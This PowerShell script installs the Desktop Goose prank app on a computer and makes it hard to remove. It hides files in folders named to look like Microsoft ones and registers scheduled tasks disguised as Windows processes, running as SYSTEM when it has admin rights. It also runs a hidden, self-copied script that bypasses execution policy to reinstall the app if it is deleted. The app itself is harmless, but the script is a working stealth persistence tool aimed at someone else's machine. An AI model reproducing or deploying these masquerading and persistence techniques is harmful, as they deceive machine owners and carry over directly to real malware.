<# 
.SYNOPSIS
    Spawns a goose on the desktop. Install Desktop Goose and make it hard to remove
.DESCRIPTION
    - With files from the Desktop Goose website, https://samperson.itch.io/desktop-goose
    - This script will install the Desktop Goose application and make it difficult to remove by creating a scheduled task that reinstalls it if deleted.
.NOTES
    Author: Mousman33

- add another layer to add to startup foler as well? Can't have one lead to the other...
- kinda designing this script to be run regularly to check everything is still in place and recreate if something is missing. Have not figured out how to call it though. 
    - have second script and make them call each other?
    - separate scheduled tasks so they dont reference each other?
    - have this script create a copy of itself in the backup location and call that copy in the scheduled task? That way if the original is deleted, the copy can still run and reinstall it.
#>
[CmdletBinding()]
param (
    [switch]$Install,
    [switch]$Remove
)
#-----------------------------------------------------------------------------------------------
#region Variables and Functions

# Determine execution context (Admin vs User) and set paths
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "Context: Administrator" -ForegroundColor Cyan
    $installPath = "$env:ProgramFiles\WinProcs"
    # create backup location to hide files
    $backupPath = "$env:ProgramFiles\Microsoft Procs"
    # options for scheduled task
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
    $taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
} else {
    Write-Host "Context: Standard User ($env:USERNAME)" -ForegroundColor Cyan
    $installPath = "$env:USERPROFILE\AppData\Local\WinProcs"
    # create backup location to hide files
    $backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
    # options for scheduled task
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
    $taskpath = "\" # Place the task in a subfolder to hide it
}

function unpack-goose {
    # Extract to the install path
    $backupzip = Get-ChildItem -Path $backupPath -Filter "Desktop Goose*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($backupzip) {
        Write-Host "Found backup zip at $($backupzip.FullName). Extracting..." -ForegroundColor Green
        Expand-Archive -Path $backupzip.FullName -DestinationPath $installPath -Force
        Write-Host "Desktop Goose extracted to $installPath" -ForegroundColor Green
    } else {
        Write-Host "Backup zip not found in $backupPath. Removing Desktop Goose..." -ForegroundColor Red
        undo-honk
        exit
    }
}

function undo-honk {
    # Remove the scheduled task
    $taskname = "WindowsProc"
    if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskname -Confirm:$false
        Write-Host "Scheduled task '$taskname' removed." -ForegroundColor Green
    } else {
        Write-Host "Scheduled task '$taskname' not found. Skipping task removal." -ForegroundColor Yellow
    }
    #remove the script scheduled task
    $scriptTaskName = "MicrosoftUtilityUpdate"
    if (get-scheduledtask -TaskName $scriptTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $scriptTaskName -Confirm:$false
        Write-Host "Scheduled task '$scriptTaskName' removed." -ForegroundColor Green
    } else {
        Write-Host "Scheduled task '$scriptTaskName' not found. Skipping task removal." -ForegroundColor Yellow
    }
    # Remove the installed files
    if (Test-Path $installPath -ErrorAction SilentlyContinue) {
        Remove-Item -Path $installPath -Recurse -Force
        Write-Host "Installed files at $installPath removed." -ForegroundColor Green
    } else {
        Write-Host "Install path $installPath not found. Skipping file removal." -ForegroundColor Yellow
    }
    # Remove the backup zip
    $backupzip = Get-ChildItem -Path $backupPath -Filter "Desktop Goose*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($backupzip) {
        Remove-Item -Path $backupzip.FullName -Force
        Write-Host "Backup zip at $($backupzip.FullName) removed." -ForegroundColor Green
    } else {
        Write-Host "Backup zip not found in $backupPath. Skipping backup zip removal." -ForegroundColor Yellow
    }
    exit
}

#endregion
#-----------------------------------------------------------------------------------------------
#region LOGIC


if ($install) {
    write-host "Installing Desktop Goose..." -ForegroundColor Green

    # Create backup directory if it doesn't exist
    if (-not (Test-Path $backupPath -ErrorAction SilentlyContinue)) {
        New-Item -Path $backupPath -ItemType Directory -Force | Out-Null
        Write-Host "Backup directory created at $backupPath" -ForegroundColor Green
    } else {
        Write-Host "Backup directory already exists at $backupPath" -ForegroundColor Yellow
    }

    #check that it was downloaded to the default location (part of install process)
    $download = Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Filter "Desktop Goose*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (Test-Path $download.FullName -ErrorAction SilentlyContinue) {
        Write-Host "Desktop Goose zip file found at $($download.FullName)" -ForegroundColor Green
        move-item -Path $download.FullName -Destination $backupPath -Force
        unpack-goose # function to extract the zip to the install path
    } else {
        Write-Host "Desktop Goose zip file not found. Please download it from the official website and place it in your Downloads folder." -ForegroundColor Red
        #manually download desktop goose zip
        write-host "First, we have to download the desktop goose zip file from the official website. Must be done manually. Please consider donating to the developer if you enjoy."
        Start-Process "https://samperson.itch.io/desktop-goose" ; pause
        if (Test-Path $download.FullName -ErrorAction SilentlyContinue) {
            Write-Host "Desktop Goose zip file found at $($download.FullName)" -ForegroundColor Green
            move-item -Path $download.FullName -Destination $backupPath -Force
            unpack-goose # function to extract the zip to the install path
        } else {
            Write-Host "Desktop Goose zip file not found in downloads. Exiting installation." -ForegroundColor Red
            pause ; exit
        }
    }

    #copy this script to the backup location so it can be called by the scheduled task even if the original is deleted
    write-host "Copying this script to the backup location for scheduled task use..." -ForegroundColor Green
    $scriptPath = $MyInvocation.MyCommand.Path
    Unblock-File -Path $scriptPath
    Copy-Item -Path $scriptPath -Destination "$backupPath\gooseprank.ps1" -Force
}

# get the path to the executable
$honk = Get-ChildItem -Path $installPath -Filter "GooseDesktop.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
if ($honk) {
    Write-Host "Desktop Goose executable found at $($honk.FullName)" -ForegroundColor Green
} else {
    unpack-goose # if the executable isn't found, try to extract it from the backup zip
    # After unpacking, check again for the executable
    $honk = Get-ChildItem -Path $installPath -Filter "GooseDesktop.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($honk) {
        Write-Host "Desktop Goose executable found at $($honk.FullName) after unpacking." -ForegroundColor Green
    } else {
        Write-Host "Desktop Goose executable not found after unpacking. Running uninstaller..." -ForegroundColor Red
        undo-honk
    }
}

# Create a scheduled task to run the executable at logon
$taskname = "WindowsProc"
if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
    Write-Host "Scheduled task '$taskname' already exists. Skipping task creation." -ForegroundColor Yellow
} else {
    Write-Host "Creating scheduled task '$taskname' to run Desktop Goose at logon..." -ForegroundColor Green
    # Create the task
    $action = New-ScheduledTaskAction -Execute $honk.FullName
    $trigger = New-ScheduledTaskTrigger -Daily -At 9am -RandomDelay (New-TimeSpan -Minutes 60) # Add a random delay to make it less predictable
    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
    Register-ScheduledTask -TaskName $taskname -Action $action -Trigger $trigger -Principal $principal -TaskPath $taskpath -Settings $settings -Force
    Write-Host "Scheduled task '$taskname' created to run at logon." -ForegroundColor Green
}

# Create a scheduled task to run this script at logon
$taskname = "MicrosoftUtilityUpdate"
if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
    Write-Host "Scheduled task '$taskname' already exists. Skipping task creation." -ForegroundColor Yellow
} else {
    Write-Host "Creating scheduled task '$taskname' to run the gooseprank script at logon..." -ForegroundColor Green
    # Create the task
    $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-WindowStyle Hidden -NoProfile -executionpolicy bypass -File `"$backuppath\gooseprank.ps1`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 12am -RandomDelay (New-TimeSpan -Minutes 60) # Add a random delay to make it less predictable
    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
    Register-ScheduledTask -TaskName $taskname -Action $action -Trigger $trigger -Principal $principal -TaskPath $taskpath -Settings $settings -Force
    Write-Host "Scheduled task '$taskname' created to run at logon." -ForegroundColor Green
}

# Call to uninstall desktop goose 
if ($remove) {
    write-host "Removing Desktop Goose..." -ForegroundColor Green
    undo-honk
}

#endregion